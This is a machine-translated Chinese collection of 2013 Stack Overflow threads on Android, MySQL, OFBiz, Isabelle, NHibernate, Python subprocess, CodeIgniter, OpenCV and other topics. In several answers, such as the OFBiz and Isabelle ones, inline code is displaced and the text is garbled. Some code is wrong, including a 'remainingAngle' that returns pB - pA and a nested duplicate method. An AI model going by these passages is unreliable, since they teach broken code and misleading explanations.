RETURN DISTINCT e; 
```

您在匹配子句中使用了不正确的关系查找。我希望这有帮助。

# c - ADC 瑞萨电子 RX62N 的配置

> ID：15899731
> 
> 赞同：0
> 
> 时间：2013-04-09T10:40:03.403
> 
> 标签：c, embedded, touchscreen, adc

我正在使用[瑞萨电子 RX62N](http://www.renesas.com/products/mpumcu/rx/rx600/rx621_62n/index.jsp)；我的屏幕使用 ADC 单元 1，我的代码使用单元 0。

是不是让两个ADC单元不能一起工作？当我分别运行“ADC”和“显示代码”时，它工作正常，但是一旦我尝试将它们集成并在屏幕上获取 ADC 值，变量就会停止读取！有什么解决办法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-11T17:49:29.830

快速浏览[用户手册](http://www.renesas.com/req/product_document_lineup_child.do?REGION_KEY=1&LAYER_KEY=2510&PDF_URL=http://documentation.renesas.com/doc/products/mpumcu/doc/rx_family/r01uh0033ej0130_rx62n.pdf&TKUPDATE=true&APNOTE=true)表明您可以使用一个 12 位 ADC 或两个 10 位 ADC，但您不能同时选择 10 位和 12 位 ADC。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-29T06:17:02.583

谢谢大家的建议和时间。

我能够解决这个问题。您指出的问题是 12 位和 10 位 ADC 不能一起工作，而且 12 位中的所有通道都被我的触摸屏用完了。因此，通过添加计时器、延迟和使用 DMAC，我终于能够将我的 ADC 数据显示到显示屏上。

问候阿什什

# java - OnEditorActionListener 中的 NullPointerException

> ID：15899737
> 
> 赞同：1
> 
> 时间：2013-04-09T10:40:25.780
> 
> 标签：java, android, nullpointerexception

在我的 Android 项目中按 Enter 时出现 NullPointerException。我用谷歌搜索，人们遇到了同样的问题，因为他们没有设置 findViewByIt。不幸的是我明白了。发生了什么事 - 为什么我有异常？

```
 @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main_page);
        textPassword = (EditText) findViewById(R.id.editText1);
        buttonLogin = (Button) findViewById(R.id.button1);
        buttonLogin.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                PrintToast(textPassword.getText().toString());
               }
             });
        textPassword.setOnEditorActionListener(new OnEditorActionListener() {

            @Override
            public boolean onEditorAction(TextView v, int actionId,
                    KeyEvent event) {
                try
                {
                if ((event.getAction() == KeyEvent.ACTION_DOWN))
                    {
                    buttonLogin.performClick();
                    }
                }
                catch ( Exception e) {
                      PrintToast(e.toString());
                }
                return false;
            }

        });

    } 
```

布局

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="@drawable/background"
    android:gravity="top"
    android:paddingBottom="@dimen/activity_vertical_margin"
    android:paddingLeft="@dimen/activity_horizontal_margin"
    android:paddingRight="@dimen/activity_horizontal_margin"
    android:paddingTop="@dimen/activity_vertical_margin"
    tools:context=".MainPage" >

    <TextView
        android:id="@+id/textView2"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_alignParentTop="true"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="15dp"
        android:text="@string/PIN_label_HelloMsg"
        android:textAlignment="center"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <Button
        android:id="@+id/button1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_below="@+id/editText1"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="35dp"
        android:text="@string/PIN_button_AcceptPIN" />

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/textView2"
        android:layout_centerHorizontal="true"
        android:text="@string/PIN_label_EnterPIN"
        android:textAppearance="?android:attr/textAppearanceMedium" />

    <EditText
        android:id="@+id/editText1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:layout_below="@+id/textView1"
        android:layout_centerHorizontal="true"
        android:layout_marginTop="30dp"
        android:ems="10"
        android:inputType="numberPassword" >

        <requestFocus />
    </EditText>

</RelativeLayout> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-09T10:45:02.333

试试这个

```
 protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main_page);
            textPassword = (EditText) findViewById(R.id.editText1);
             buttonLogin = (Button) findViewById(R.id.button1);
            textPassword.setOnEditorActionListener(new OnEditorActionListener() {

                @Override
                public boolean onEditorAction(TextView v, int actionId,
                        KeyEvent event) {
                    try
                    {
                    if ((event.getAction() == KeyEvent.ACTION_DOWN))
                        {
                        buttonLogin.performClick();
                        }
                    }
                    catch ( Exception e) {
                          PrintToast(e.toString());
                    }
                    return false;
                }

            }); 
```

**[编辑]**这很好用

```
Button buttonLogin;
EditText textPassword ;
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);
textPassword = (EditText) findViewById(R.id.editText1);
 buttonLogin = (Button) findViewById(R.id.button1);
    buttonLogin.setOnClickListener(new OnClickListener() {
        public void onClick(View v) {
           Toast.makeText(MainActivity.this, textPassword.getText().toString(), Toast.LENGTH_LONG).show();
           }
         });
    textPassword.setOnEditorActionListener(new OnEditorActionListener() {

        @Override
        public boolean onEditorAction(TextView v, int actionId,
                KeyEvent event) {

            @Override
    public boolean onEditorAction(TextView v, int actionId,
            KeyEvent event) {

         if (actionId == EditorInfo.IME_ACTION_DONE) {
             // do your stuff here

            buttonLogin.performClick();
            Log.e("Called","Called OKKKKKK");
            return true;
            }

        Log.e("Called","Called");

        return false;

    }

    });

} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-09T10:42:28.317

该按钮未绑定到您的布局：

```
buttonLogin.performClick(); 
```

在这里你得到NPE。在之后添加`setContentView`：

```
 buttonLogin = (Button) findViewById(R.id.your_button_id); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-05-08T10:37:09.107

我知道这是一篇旧帖子，但我想澄清这个问题背后的原因，希望人们能够理解原因而不仅仅是修复。

**可操作的关键事件**

[OnEditActionListener](http://developer.android.com/reference/android/widget/TextView.OnEditorActionListener.html)正在侦听特定的可操作事件，而不是 KeyEvent.ACTION_DOWN 事件。从历史上看，它被用于 SoftIME（虚拟键盘）上的可操作按钮，即搜索、下一个或换行按钮，其实现是针对该用途的。

**硬件关键事件**

[OnKeyListener](http://developer.android.com/reference/android/view/View.OnKeyListener.html)可用于特定键输入或特殊键事件，如 KeyEvent.KEYCODE_DPAD_UP、KeyEvent.KEYCODE_BACK 或 KeyEvent.KEYCODE_BOOKMARK。但是，它仅用于硬件键盘事件。

**实时文本更改硬/软键盘**

对于整个 TextView/EditText 的事件更改，您可以使用[TextWatcher](http://developer.android.com/reference/android/text/TextWatcher.html)，每次修改可编辑区域时都会触发它。通过一些细微的修改，您可以连接并检查特定的字符变化。

**为什么**

OnEditActionListener 正在侦听*可操作*事件，并通过挂钩到视图层次结构系统回调来做到这一点。这意味着根据框架的延迟，以及事件如何传播到子回调，某些事件可能在它们到达我们时已经被消费了。

无论事件是否为空，我们仍然可以通过 actionId 检查操作（也就是说，我假设为什么给出它）。

TCA 的回答是正确的，但我将添加我的实现只是为了彻底并添加一些额外内容。

```
 textPassword.setOnEditorActionListener(new TextView.OnEditorActionListener() {
        @Override
        public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
            switch( actionId ) {
                case EditorInfo.IME_ACTION_DONE:
                    // clear textPassword focus and hide SoftIME
                    textPassword.clearFocus();
                    InputMethodManager imm = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                    imm.hideSoftInputFromWindow(textPassword.getWindowToken(), 0);

                    // call buttonLogin OnClickListener through performClick, if it exists
                    buttonLogin.performClick();
                    break;
            }
            return true;
        }
    }); 
```

# wpf - 如何让 WPF 项目在运行时构建？

> ID：15899745
> 
> 赞同：2
> 
> 时间：2013-04-09T10:40:44.547
> 
> 标签：wpf, visual-studio-2012, msbuild

在 Visual Studio 2012 中，我希望我的项目在运行时构建。通常我会通过

选项 > 项目和解决方案 > 构建和运行 > 项目过期时始终构建。

对于我所有的其他解决方案 Winforms、MVC、类库等，这种情况会发生，但 WPF 项目不会发生。如何使它成为 WPF 中的默认行为？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T11:41:15.497

您必须检查您的解决方案属性-> 配置属性中是否为您的 WPF 项目检查了“构建”列！

# mysql - 更改 MYSQL 表添加主键，然后对表进行分区

> ID：15899747
> 
> 赞同：1
> 
> 时间：2013-04-09T10:40:48.703
> 
> 标签：mysql, sql, database

当我尝试将主键添加到 MYSQL 表然后根据该表的日期列对其进行分区时，请解释我需要考虑的检查点

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T11:34:53.693

对于主键创建：

您可能要确保：

*   表上还没有定义主键，

    使用`DESCRIBE TABLE`查询。

*   将用作主键的列在聚合时不包含重复项。

    ```
    SELECT CONCAT(col1, col2, col3) AS key
    FROM table
    GROUP BY col1, col2, col3
    HAVING COUNT(key) > 1 
    ```

    或者，您可以使用查询`IGNORE`上的选项`ALTER TABLE`删除重复项并将第一个匹配条目保留为主键。

*   除了 InnoDB，确保存储节点上至少有足够的可用空间，这通常比表的大小大一点，因为 MySQL 会在更改表时将表复制到新文件中.

对于特定列上的分区，该列必须是主键的一部分，并且可以选择它自己的索引。因此，您必须在用于创建主键的列组和上面的检查列表中包含您希望分区的日期。

# database - OFBiz 多租户

> ID：15899748
> 
> 赞同：0
> 
> 时间：2013-04-09T10:40:55.550
> 
> 标签：database, multi-tenant, ofbiz, opentaps

OFBiz/Opentaps 应用程序的不同部分能否连接到多租户配置中的不同租户？

例子：

*   派对管理 => 连接到默认数据库
*   目录管理 => 连接到租户 1

在 Ofbiz 应用程序的同一实例中工作

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T14:18:41.917

OFBiz 多租户通过为每个租户使用单独的数据库来工作。而且 ofbiz 应用程序具有数据库级别的相互依赖关系，因此所有应用程序都必须在同一个数据库中。所以答案是否定的，您不能在单独的数据库中拥有单独的 OFBiz 应用程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T06:48:01.237

是的，将租户数据库连接到每个组件（如`Catalog Manager`or经理、设施经理和会计具有数据级别的依赖性。`Party Manager``web.xml``OFBiz`

# isabelle - 获得更具体的引理的规范方法

> ID：15899754
> 
> 赞同：1
> 
> 时间：2013-04-09T10:41:04.500
> 
> 标签：isabelle, apply-script

假设我有一个引理`mylem: foo ?a = bar ?a`，我需要将它应用到一个目标上，该目标有两次出现`foo`，例如`baz (foo (f p q)) (foo (g r s))`，但只出现在其中一个位置上。我知道有两种方法可以做到这一点，而不必写出所有的`p`, `q`...，这可能是复杂的表达式。

*   使用`apply (subst mylem)`后跟适当数量（此处为 0 或 1）的`back`命令。
*   使用`apply (subst mylem[where a = 'foo x y', standard])`, where`x`和`y`是未绑定的名称。

这里的使用`subst`只是为了演示；我真的很想修改引理，例如，`rule`当有多个可能的匹配项我想以这种方式消除歧义时使用它。

这两种方法对我来说都是不好的风格。有没有更好的方法来实现这一目标？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T11:43:57.613

您可以判断`subst`它应该替换哪个事件：在第 -th 匹配事件处`subst (i) mylem`展开。这可以节省您的步骤。您还可以列出多个职位，如。如果要在场所展开，请使用.`mylem``i``back``subst (1 2) mylem``mylem``subst (asm) (1 2) mylem`

一般来说，我不知道在`apply`脚本中实现你想要的东西的方法。在理论层面上，您可以使用`lemmas`with`for`子句来概括局部引入的变量：

```
lemmas mylem' = mylem[where a="f x y"] for x y 
```

在结构化证明中，您可以像这样明确地执行此操作：

```
{ fix x y note mylem[where a="f x y"] }
note mylem' = this 
```

# c# - 简单的一对多 fluent-nhiberante

> ID：15899755
> 
> 赞同：1
> 
> 时间：2013-04-09T10:41:06.950
> 
> 标签：c#, mysql, nhibernate, fluent-nhibernate

我有简单的一对多关系

```
public class Product
{
    public virtual Guid Id { get; set; }
    public virtual string Name { get; set; }
    public virtual string Category { get; set; }
    public virtual bool Discontinued { get; set; }
    public virtual IList<ProductCampaignTargeting> Targetings { get; set; }   
}

public class ProductCampaignTargeting
{
    public virtual Guid ID { get; set; }

    public virtual int TargetType { get; set; }

    public virtual string TargetValue { get; set; }

    public virtual Product Product { get; set; }
 } 
```

带映射：

```
class ProductCampaignTargetingMap : ClassMap<ProductCampaignTargeting>
{
    public ProductCampaignTargetingMap()
    {
        Table("campaign_targetings");
        Id(x => x.ID).GeneratedBy.Guid();

        Map(x => x.TargetType).Column("target_type");
        Map(x => x.TargetValue).Column("target_value");

        References(x => x.Product).Column("campaign_id_fk");
    }
}

class ProductMap: ClassMap<Product>
{
    public ProductMap()
    {
        Table("Product");
        Id(x => x.Id).Column("id").GeneratedBy.Guid();

        Map(x => x.Name).Column("Name");
        Map(x => x.Category);
        // check why inverse doens't work

        HasMany(x =>         x.Targetings).KeyColumn("campaign_id_fk").Cascade.AllDeleteOrphan().AsBag();
    }
} 
```

它正在工作 - 但是子（许多）表使用两个命令更新 - 插入然后更新 当我想将其更改为一个命令时，我使用 Inverse() 选项 - 但是外键填充为空，我在这里失踪了吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T12:44:37.900

使用 Inverse 时外键为空，因为在将 ProductCampaignTargeting 添加到集合时必须维护关系的双方：

```
target.Product = product;
product.Targetings.Add(target); 
```

这是许多 NHibernate 开发人员建议将集合公开为 IEnumerable 或只读并封装 Add 和 Remove 方法的原因之一：

```
void AddTarget(ProductCampaignTargeting target)
{
    target.Product = this;
    Targetings.Add(target);
} 
```

# c - 如何在 C 中编写函数？

> ID：15899760
> 
> 赞同：-6
> 
> 时间：2013-04-09T10:41:13.167
> 
> 标签：c, function

我正在从Aaron Hillegass的*Objective-C Programming的第一部分学习 C。*我正在尝试完成章末挑战之一，但似乎无法确定所需的功能，也找不到指导示例。我需要编写一个函数，它采用前两个角度并返回第三个角度：

```
#include <stdio.h>

**//add your new function here**

int main(int argc, const char * argv[])
{
    float angleA = 30.0;
    float angleB = 60.0;
    float angleC = remainingAngle(angleA, angleB);
    printf("The third angle is %.2f\n", angleC);
    return 0;
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T10:49:10.367

由于这是您的学习练习，因此我不会为您编写代码，但会给您一些建议。

当你编译你展示的代码时，它会编译得很好，但不会链接，抱怨缺少符号`remainingAngle`- 这是你需要编写的函数。在代码中已经有一个注释指示这个函数将去哪里。我假设您对函数的定义方式很熟悉（至少有一点）。

在您的程序中，您的函数将接受两个参数并返回一个值。当您处理角度时（在三角形中？），并且从现有代码中，您可以推断出类型是`float`. 因此，您将需要添加此功能：

```
float remainingAngle(float angleA, float angleB) {
   ...
} 
```

代替`...`您将需要编写代码来计算剩余的第三个角度并返回值。它可以在几行中完成，例如

```
float angleC = ...; /* place your formula here */
return angleC; 
```

或者您可以将它们组合成一行。现在，考虑到这些信息，尝试编写所需的函数。如果您仍然遇到问题，请回帖。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T10:46:05.663

```
float remainingAngle (float pA, float pB)
{
   return pB - pA;   // please switch to a better approach
}

int main(int argc, const char * argv[])
{
  .... 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T11:00:56.487

编写函数的语法是：

```
return-type function-name(list-of-arguments){
   statements
} 
```

*   返回类型：- int、double、char、float、short、long、*struct*、*指针*
*   函数名称：- 例如。剩余角
*   参数列表：- 逗号分隔 例如：float x, int y
*   语句：变量声明，语句例如。返回 x+y；

# sql - 查询 (SQL) Oracle/Toad 转储文件而不导入它们

> ID：15899769
> 
> 赞同：0
> 
> 时间：2013-04-09T10:41:43.577
> 
> 标签：sql, oracle, dump, toad

我们正在使用 Toad for Oracle 的导出功能对我们的数据库进行每月数据转储。我们有一些 SQL 查询来创建有关数据的统计信息。我想将当前状态的结果与最近几次转储进行比较。

我可以使用 Toad (v11) 中的导出文件浏览器打开文件并使用 GUI 对数据进行排序/过滤，但这还不够强大。有没有一种方法可以使用 SQL 查询转储文件，而无需采取额外的步骤，例如创建新模式并导入它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-09T14:51:06.830

到目前为止，最好的方法是重新导入数据。

# python - 从 CSV 打开文件并使用 strip 和 split 函数返回它

> ID：15899773
> 
> 赞同：1
> 
> 时间：2013-04-09T10:41:57.037
> 
> 标签：python

所以这是我的问题代码，有一个包含 2 行信息的 CSV 文件，但是当您只拆分数据时，您最终会在所有行的末尾得到 /n，因此为什么函数中有一条. 但是我不知道如何正确使用该功能，希望有专业人士可以帮助修复此功能，谢谢。我还需要以某种方式将它变成一个我不知道该怎么做的元组。

```
def load_friends(filename):
    v = []
    with open(filename, 'Ur') as f:
        for line in f:
            line = line.strip()
            line = line.split(',')
            line.append(tuple)
    return v
    f.close 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:49:11.737

不要重新发明轮子，使用[标准`csv`库](http://docs.python.org/2/library/csv.html)：

```
import csv

def load_friends(filename):
    with open(filename, 'Ur') as f:
        v = [tuple(rec) for rec in csv.reader(f, delimiter=',')]
    return v 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:45:08.700

我相信这就是你想要的。这是您的代码的简化，但是请使用@eumiro 的解决方案，因为该`csv`库是为此而构建的。

```
def load_friends(filename):
    with open(filename, 'rU') as f:
        return [tuple(line.strip().split(',')) for line in f] 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T10:45:40.837

```
def load_friends(filename):
    v = []
    with open(filename, 'Ur') as f:
        for line in f:
            line = line.strip()
            line = line.split(',')
            line = tuple(line)
            v.append(line)
    return v 
```

您需要转换为元组并将其附加到`+`. `line.append(tuple)`没有任何意义，它只是将一个数据类型附加到 list `line`。

或者，

```
def load_friends(filename):
    with open(filename, 'rU') as f:
        return [tuple(line.strip().split(',')) for line in f] 
```

# c - 消息“在 GCC 4.4 中使用灵活数组成员传递结构的 ABI 已更改”重要吗？

> ID：15899774
> 
> 赞同：7
> 
> 时间：2013-04-09T10:41:59.600
> 
> 标签：c, gcc, compiler-construction

我想知道来自编译器的这条消息是否应该仔细考虑。

我们来看下面的代码：

```
struct s
{
  int a;
  int b[];
};

void fun(struct s c)
{
}

int main()
{
  return 0;
} 
```

这给出了以下错误：

```
main.c:7:6: note: the ABI of passing struct with a flexible array member has changed in GCC 4.4 
```

我的问题是：在更大的项目中使用这种结构安全吗？这种结构的可能风险和影响是什么（除了编译器消息）？

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2013-04-09T10:50:57.067

1.  关于内存，每次我们调用这个函数时都会创建结构变量，所以浪费内存。
2.  确认您的项目中是否需要 struct sc 或 struct s &c。

# shared - 异步访问几乎只读的共享列表

> ID：15899787
> 
> 赞同：0
> 
> 时间：2013-04-09T10:42:34.277
> 
> 标签：shared, synchronized, readonly-collection

```
public class PlanetInfo {
    String planetName="";
    int a;
    int b;
    int c;

    PlanetInfo(planetname){
        planetName = planetname;
        if(planetName.equals("earth")){
            a=1;
            //....
        }
        else if(planetName.equals("mars")){
            a=2;
            //....
        }
    }       
}

public final class Infos {
    static final LinkedList<PlanetInfo> planets = new LinkedList<PlanetInfo>();

    private static synchronized PlanetInfo internal_getPlanetInfo(String planetName){
        for(int i=0;i<planets.size();i++){
            if(planets.get(i).planetName.equals(planetName)){
                //return existing PlanetInfo:
                return planets.get(i);
            }
        }

        //if not found then create and return a new one:
        return new PlanetInfo(planetName);

    }

    public static PlanetInfo getPlanetInfo(String planetName){
        return internal_getPlanetInfo(planetName);
    }
}

public class Foo {    
    PlanetInfo planetinfo = null;
    public Foo(aplanet){
        planetInfo = Infos.getPlanetInfo(aplanet);
    }

    public void dosomthing(){
        if(planetInfo.a==1){//please, do not wonder about thread-safe here, it's just a simplification...
            // etc....
        }
    }

} 
```

创造新需求的情况很少见`PlanetInfo`，但它确实发生了。一旦`PlanetInfo`创建并添加到`Infos.planets`，**它永远不会被删除**。大多数时候，`Infos.planets`实际上是只读的。

有很多线程都有 的实例`Foo`，它们都需要一个指向`PlanetInfo`对象的指针。如您所见，`internal_getPlanetInfo`是同步的。

我想知道我是否可以更改代码，所以它可能会尝试**2 次**来找到所需的`PlanetInfo`. 第一次尝试将是**Asynchronously**，并且（如果没有找到那么做）第二次**synchronously**。所以......该方法`getPlanetInfo`将执行与方法相同的for循环`internal_getPlanetInfo`。因此，大多数时候线程不会相互锁定。

我想到的是一个线程可能有一个“陈旧”的副本`Infos.planets`，**但是！**这个“陈旧”副本的唯一潜在问题是它错过了一段时间后添加的项目。因此，如果找不到所需的项目，那么我们使用**“主”**副本查找它。

```
public static PlanetInfo getPlanetInfo(String planetName){
    //try to find it Asynchronously:
    for(int i=0;i<planets.size();i++){
        if(planets.get(i).planetName.equals(planetName)){
            return planets.get(i);
        }
    }
    //if not found then do it synchronously:
    return internal_getPlanetInfo(planetName);
} 
```

任何意见将不胜感激！

我做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-21T17:03:42.640

您所描述的实际上是一个绝妙的想法，尤其是在高度并发的情况下。下面的模式将确保“值”只计算一次，并且关键部分被执行最少次数。在与语言无关的伪代码中，模式如下：

```
if value is-not-available then
    // Entering critical section
    if value is-not-available then
        value = comupte-the-value
    // Exit critical section.
}
return value; 
```

我建议，如果还不是这样的话，PlanetInfo 对象是不可变的，并且当它们的信息发生更改时，您只需要创建一个具有更改值的新对象。只读对象避免了很多并发问题。

过时问题可以通过额外的间接级别轻松解决。相反，Foo 持有一个 PlanetInfo 参考，他们应该保持一个 planetInfoIndex（进入 Info.planets）。当已知有关行星的新信息时，该索引处的引用将替换为新的不可变对象。下次任何 Foo 对象访问该信息时，将返回新对象。

# php - 仅使用 javascript 为移动设备加载 div

> ID：15899789
> 
> 赞同：0
> 
> 时间：2013-04-09T10:42:37.150
> 
> 标签：php, javascript, jquery, html, mobile

如果检测到移动设备或分辨率低于 641 像素，是否可以加载 div？我有不同的桌面和移动菜单。移动菜单使用图像 svg sprite，但对于桌面，我不希望加载该 svg 图像以保存 HTTP 请求。我可以根据媒体查询隐藏 div，但我怎样才能至少防止图像被加载，或者仅为移动设备加载内部菜单 div？最好的方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-09T10:48:14.150

您可以防止图像在某些条件下被加载

```
$(document).ready( function() { 
  if(yourCondition){
    $("img").removeAttr("src");
  }
 }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T10:44:33.343

[https://code.google.com/p/php-mobile-detect/wiki/Mobile_Detect](https://code.google.com/p/php-mobile-detect/wiki/Mobile_Detect)

检查上面的链接，您可以在 if else 语句中使用它来根据设备类型显示隐藏 div

```
<?php
// Written By Adam Khoury @ developphp.com - March 26, 2010
// PHP swapping CSS style sheets for target device layouts
// Make your index page of your site a .php file instead of .html
 $styleSheet = "default.css";
$agent = $_SERVER['HTTP_USER_AGENT']; // Put browser name into local variable

if (preg_match("/iPhone/", $agent)) { // Apple iPhone Device
// Set style sheet variable value to target your iPhone style sheet
   $styleSheet = "iphone.css";

} else if (preg_match("/android/", $agent)) { // Google Device using Android OS
// Set style sheet variable value to target your Android style sheet
$styleSheet = "android.css";

}
?> 
```

以上代码仅取自[http://www.developphp.com/view_lesson.php?v=310](http://www.developphp.com/view_lesson.php?v=310)，如果需要，请查看完整代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-09T12:04:27.433

如果您最大的问题是在不需要时阻止加载某些图像，我建议您继续使用媒体查询。如果您加载不同的 css 文件（取决于媒体），您可以将所需的图像添加为“背景图像：”。这也适用于 SVG Site。

[如何在保持纵横比和可伸缩性的同时使用 SVG Sprite Sheet 作为 CSS 背景图像](https://stackoverflow.com/questions/10956636/how-to-use-svg-sprite-sheet-as-css-background-image-while-maintaining-aspect-rat)

# php - 未找到扩展核心类

> ID：15899790
> 
> 赞同：1
> 
> 时间：2013-04-09T10:42:40.307
> 
> 标签：php, codeigniter, codeigniter-2

我有一些codeigniter 应用程序。它在我的本地服务器上运行良好。将其上传到托管服务器后，它将无法工作并导致错误：

```
Fatal error: Class 'System_Controller' not found in /home/k2113138/public_html/test/application/controllers/login.php on line 3 
```

这是我扩展 CI_Controller 的系统控制器：

```
<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');

//location: application/core/    
class System_Controller extends CI_Controller {

        public function __construct(){
            parent::__construct();
            //some code
        }
    } 
```

我的控制器：

```
 <?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
  //location: application/controllers/
  class Login extends System_Controller {

public function __construct()
    {
        parent::__construct();
    }
  } 
```

我已将我的配置设置为我想要的配置，如下所示：

```
<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
$config['base_url'] = 'http://xx.com/subfolder/';
$config['subclass_prefix'] = 'System_';
?> 
```

我已经阅读了很多讨论这个问题的文章，但仍然找不到解决方案。真的对这个问题感到困惑，因为在本地服务器上一切正常。我已将配置文件配置为所需的内容，例如数据库和路由配置。还有其他需要我重新配置的东西吗？

编辑：我的 Codeigniter 版本是 2.1.3

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T20:55:34.740

好的，您将 更改`filename`为小写，现在，也尝试更改`classname`：

```
class system_controller extends CI_Controller 
```

如果不运行，请使用类名和文件名，这是您的服务器的问题，在共享服务器中很常见。

有时，PHP 版本及其配置会在这种情况下发挥重要作用。

# python - subprocess.Popen 在不同的控制台

> ID：15899798
> 
> 赞同：35
> 
> 时间：2013-04-09T10:43:10.670
> 
> 标签：python, python-2.7, subprocess, popen

我希望这不是重复的。

我正在尝试使用`subprocess.Popen()`在单独的控制台中打开脚本。我试过设置`shell=True`参数，但没有成功。

我在 64 位 Windows 7 上使用 32 位 Python 2.7。

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2013-12-16T13:49:02.497

要在不同的控制台中打开，请执行（在 Win7 / Python 3 上测试）：

```
from subprocess import Popen, CREATE_NEW_CONSOLE

Popen('cmd', creationflags=CREATE_NEW_CONSOLE)

input('Enter to exit from Python script...') 
```

# 有关的

[如何生成新的 shell 以从基本 python 脚本运行 python 脚本？](https://stackoverflow.com/q/6469655/1882644)

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-04-09T10:44:04.847

```
from subprocess import *

c = 'dir' #Windows

handle = Popen(c, stdin=PIPE, stderr=PIPE, stdout=PIPE, shell=True)
print handle.stdout.read()
handle.flush() 
```

如果您不使用`shell=True`，则必须提供`Popen()`列表而不是命令字符串，例如：

```
c = ['ls', '-l'] #Linux 
```

然后在没有外壳的情况下打开它。

```
handle = Popen(c, stdin=PIPE, stderr=PIPE, stdout=PIPE)
print handle.stdout.read()
handle.flush() 
```

这是您可以从 Python 调用子进程的最手动和最灵活的方式。如果您只想要输出，请选择：

```
from subproccess import check_output
print check_output('dir') 
```

* * *

# 要打开一个新的控制台 GUI 窗口并执行 X：

```
import os
os.system("start cmd /K dir") #/K remains the window, /C executes and dies (popup) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-11T19:22:19.963

在 Linux shell=True 上可以解决问题：

`command = 'python someFile.py' subprocess.Popen('xterm -hold -e "%s"' % command)`

不适用于 gnome-terminal，如下所述：

[https://bbs.archlinux.org/viewtopic.php?id=180103](https://bbs.archlinux.org/viewtopic.php?id=180103)

# c++ - 使用openCV检测ROI

> ID：15899799
> 
> 赞同：2
> 
> 时间：2013-04-09T10:43:11.407
> 
> 标签：c++, visual-c++, opencv, image-processing

我正在做一项工作，我必须找到感兴趣区域 (ROI)，然后对图像执行阈值：

![在此处输入图像描述](https://i.stack.imgur.com/gPZY8.jpg)

由于我不是来自计算领域，所以我遇到了一些困难。

我开始尝试通过以下代码找到投资回报率：

```
// code
string filename = "2011-06-11-09%3A12%3A15.387932.bmp";

Mat img = imread(filename)

if (!img.data)
{
    std::cout << "!!! imread não conseguiu abrir imagem: " << filename << std::endl;
    return -1;
}

cv::Rect roi;
roi.x = 0
roi.y = 90

roi.width = 400;
roi.height = 90;

cv::Mat crop = original_image(roi); 
cv::imwrite("2011-06-11-09%3A12%3A15.387932.bmp", crop); 
```

非常感谢。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-04-09T13:21:55.520

我假设您有兴趣隔离图像的数字，并且您想手动指定 ROI（鉴于您编写的内容）。

您可以[**为 ROI 使用更好的坐标，**并将其裁剪为新`cv::Mat`](https://stackoverflow.com/a/13533305/176769)坐标，以获得如下输出：

![在此处输入图像描述](https://i.stack.imgur.com/LZ6Kf.png)

仅当您想隔离数字以稍后进行一些识别时，才在此图像上执行阈值才有意义。为此提供了一种很好的技术，[`cv::inRange()`](https://stackoverflow.com/a/7959488/176769)它对所有通道（RGB 图像 == 3 通道）执行阈值操作。

**注意**：`cv::Mat`按 BGR 顺序存储像素，在指定阈值时记住这一点很重要。

作为一个简单的测试，您可以执行**从 B:70 G:90 R:100 到 B:140 G:140 R:140**的阈值以获得以下输出：

![在此处输入图像描述](https://i.stack.imgur.com/QKf53.png)

不错！我稍微更改了您的代码以获得这些结果：

```
#include <cv.h>
#include <highgui.h>
#include <iostream>

int main()
{
    cv::Mat image = cv::imread("input.jpg");
    if (!image.data)
    {
        std::cout << "!!! imread failed to load image" << std::endl;
        return -1;
    }

    cv::Rect roi;
    roi.x = 165;
    roi.y = 50;
    roi.width = 440;
    roi.height = 80;

    /* Crop the original image to the defined ROI */

    cv::Mat crop = image(roi);
    cv::imwrite("colors_roi.png", crop);

    /* Threshold the ROI based on a BGR color range to isolate yellow-ish colors */

